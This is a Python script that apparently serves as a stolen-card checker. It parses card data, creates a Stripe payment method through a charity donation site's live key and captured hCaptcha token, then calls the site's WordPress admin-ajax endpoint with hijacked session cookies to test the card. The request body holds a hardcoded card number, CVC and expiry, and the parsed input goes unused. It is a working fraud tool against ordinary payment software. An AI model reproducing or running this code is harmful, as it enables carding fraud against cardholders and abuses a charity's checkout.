import time
import requests
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Tome+Amek&billing_details[email]=ttxzv%40gi.com&billing_details[address][line1]=Rts+%2F58&billing_details[address][line2]=58&billing_details[address][city]=Gkevoa&billing_details[address][state]=Kvvekvs&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]=4744890022490954&card[cvc]=644&card[exp_month]=07&card[exp_year]=28&guid=7bb8dee3-e8e1-44be-90e6-d15e764ef624fb2917&muid=4e55061e-ebf1-4656-a499-ef1d3f44e26a670630&sid=5c6116ab-a8d8-4ab2-b8b7-cf94f71e901e40a20d&payment_user_agent=stripe.js%2F0d2881eb5d%3B+stripe-js-v3%2F0d2881eb5d%3B+card-element&referrer=https%3A%2F%2Fgivinghand.charity&time_on_page=21782&key=pk_live_51Oo8yRK1XnH7l7ooUZvgdm1OY9mZ96hwxveVZrpiMi6kg0oPDzcwWFsTij3B2MAMLaNrJOcUbkfg5wJlglbhg34N00GvOmUclN&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZwbS6Tiw1UjekZXF4PgaHIzxPOVENpgzRv74DxaWOiMx4EPB2-rc3qq5qpz7gTNMUxtk0UC72PhwmkctSwO_ugfQY52IDlWpMPpuzT6hut3eTDzGfofUQqi5DH8fzblDTA_YdrPmBXp9u2Kra2RkxPkYQZXWjUyeTddSgImAdm2sVhYGzCrN_Jt3zrvi4hLT7r8ki_ApVh8tehBIgmNzDoV8CyqJez065X9v72CAcE66yco5RVJQ4T3avG3W_18O7plBk-wc_YBxF_r6pqqzRfHEPHmxkY_Wt18K0mWEO-z5KyLaAA0DKy8pc4lvxWPUGLTGH6eLgJ94f5EZf2aEYlP-3irpElrOW5Vj2EjtCaPeeNyIcenByXMfhHFhqpltZTeb8-8OYgmb1zZwS6f_k1x7u68abl2Tai6sqL9s12j_r-EJUgq9nAkH2qCCvxZj3n9hk0r5mMY049F4YGDVeVh5zBPn4TcZWcvT4IIZ5HgpY0bnpLyoMVqGraTcr3taCFs8eo9YmiZXKFCXnXnL_PxpIskc2Gxi4dwakumxmk2wzu77cY86hX0Vv-_kgGObrH_9udQR-K3FU8t8obv4sS1GYtdtqh984OUCgMzFTgy8NizchseawG2CoyrimiX0uFMB3yqKqzviaMcWF8kEsqWKwXTIRq9270xJDhCyfVOPkAdm8IX8cIxKc2jmHrE8aEsafP8-nr5BGD6I9PwHNQw2dAoXhyIM34nZrGV7yBLEayz5YcC8mngbFXSwvi2V3jJ_aawHPVApnzBHlGhySiTYdxc_Tap3KM_El3lymzy6BU7BI09G8zRvsdTgy_PmAVCaWFEn_PFRgcoNORZzPs8OXaLUPKtNNnnq5Rs_1nJbVQ94EK0uR3YcBuTC3BchLCW9ax4clbBD3lv2MZbdHu5kSbvbtqg-wSJPuKNH2o0tViRPGkHX5dChfh32s9kIr5ndqEPWxJ7aWUk-2bPxegIdwSOhXh_4psHAZDuz5VfY0CBtlY4QV4Aa-op0FuI8HhxB_OfjOoxUBrEr-zj16kuKVBGkUKVXVFHsbjLgKPGpN6gdJH_UG9RsSOtmoHBpzoLGFfjLaQRuaNZFSzyNsiRidZZN_3IZQeDi3qp7Jcd5W4bxWXwz6f_wRWYSQWzYITXsZEYv-P6eSAiSzqnAquD3onDDe7rx4Q4Nm_uyADj-qHMmDMTW5FbMXlCRciNI6dgiMJ1Nga58wH7R1atwzMt_xAPA1KRSacqqCQS_uqNYQ8kEmHE9df7-hUwE8CaNz15MMMps2qA3RyhMSWormtQuVocZ4nGHbfiwx4daKW7uaA9otLsMi24g2tZr75WjziuqAR9sC5kvSXAz7SoYbRUB7S2QlyS8M7LDfXeRM2pp7ZuX5FeIcsmp1Fz6QV-I5x2ow4TzaDAumelnThZsyxbnEjnDeQ38AFipFOxnaQ3w7gsk5O-0XIkai1ubXl7vxthavLLfr-IB6NEealGiial_iR_tbfbsRckoReOThuDjUj9SLqKFpZIZ4Zwz1bZPLnwkvAmcjc5VfhccR8lWUhDZVe9Acmrhv3pw19t9mL6kLPApSWc2QN4Ah-azr0TKgVMXwVbKY_qT-BarNuAmMFi7MVDamCIJk_27tSWLjJ9xgsU27lN8uVkthkug7VCaunL3asW-gos5xOLaMfjY5XO4GH4Z3Qz7FRMuC4061BgXGA4bK_p4YE-ZNOqD1N-cnuluVyuZTMoYoXFPAl3xPy0J4SUesn19it9RHC9G5-q_oRIJfM1QfpUrpdlxNHFrVCAUD6XRXJKW2thbwnSRW-iLBYvynv1vceVJiU00dtccOHG9nytvTwvtpWzR6nbuweOLrPU8H7ExIgEx9P1u0W5Bs6uFkVoOwbd-Gl4yze2FY3IukkpqUbGDXnrAY4Bm0UXKFlOsC_6A3gByaJWHNdCgE9RgV23xJjGaeg79k1SEzzLTtBdf27bVJQtXQP_qDiu0oBWVj08CqEcthvulq8uYGAuoNVC8oQj8PJ9fm8CNUJ1KyPMcSSWnkd6bJgT6s0tO5SLNOXhMkYEHmfAfyW1ghLUsZ4C67zZnJUigO7LLlLyQY0d-GGmqDdAuVgD0v5VfnM_bG-IOKOH08xnr73A1OX6Zmh88HtML0OqZBkl9MX4vjohcnOHZAh0hUUZtuCytccQCHjcTYaSVOhVEiNmqNleHDOZleZ0ahzaGFyZF9pZM4DMYNvomtyp2E1ZmY4YjiicGQA.HWIgLy45y_qoWCWBsWJ47jHlsaXPplQK6_emkXmcoLU'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return '#'
	import requests
	
	cookies = {
	    'i3CURRENCY': 'GBP',
	    'i3CID': '9fe494a7-a1cc-45f3-bb9d-2e470fb847a0',
	    '_ga': 'GA1.1.1727589889.1717011628',
	    '__stripe_mid': '4e55061e-ebf1-4656-a499-ef1d3f44e26a670630',
	    'PHPSESSID': 'qamch82p1s03bkhoppvt4t7geu',
	    'cf_clearance': 'diyR5FKbfKSa0S2cAgtVwJIt2fJFSD8bwDBW7vlgFQY-1717016869-1.0.1.1-JKAFQ3wvHlh2Q8_EJhHDPSLUIyenx6s9469gtlyZmkh8xZH.q3pqOk1.lMUm8_0VMBK6j2DmNx3bHCIiIlH2zQ',
	    '__stripe_sid': '5c6116ab-a8d8-4ab2-b8b7-cf94f71e901e40a20d',
	    'i3d-statement': '9fe494a7-a1cc-45f3-bb9d-2e470fb847a0',
	    '_ga_L9VVPNYMBN': 'GS1.1.1717016869.2.1.1717016915.0.0.0',
	}
	
	headers = {
	    'authority': 'givinghand.charity',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'i3CURRENCY=GBP; i3CID=9fe494a7-a1cc-45f3-bb9d-2e470fb847a0; _ga=GA1.1.1727589889.1717011628; __stripe_mid=4e55061e-ebf1-4656-a499-ef1d3f44e26a670630; PHPSESSID=qamch82p1s03bkhoppvt4t7geu; cf_clearance=diyR5FKbfKSa0S2cAgtVwJIt2fJFSD8bwDBW7vlgFQY-1717016869-1.0.1.1-JKAFQ3wvHlh2Q8_EJhHDPSLUIyenx6s9469gtlyZmkh8xZH.q3pqOk1.lMUm8_0VMBK6j2DmNx3bHCIiIlH2zQ; __stripe_sid=5c6116ab-a8d8-4ab2-b8b7-cf94f71e901e40a20d; i3d-statement=9fe494a7-a1cc-45f3-bb9d-2e470fb847a0; _ga_L9VVPNYMBN=GS1.1.1717016869.2.1.1717016915.0.0.0',
	    'origin': 'https://givinghand.charity',
	    'referer': 'https://givinghand.charity/checkout/payment-processing/?statement_id=9fe494a7-a1cc-45f3-bb9d-2e470fb847a0&gateway=stripe_intent',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'get_single_intent',
	    'payment_method_id': id,
	    'statement_id': '9fe494a7-a1cc-45f3-bb9d-2e470fb847a0',
	}
	
	response = requests.post('https://givinghand.charity/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data).json()
	time.sleep(20)
	try:
		ii=response
	except:
	    return 'success'
	return ii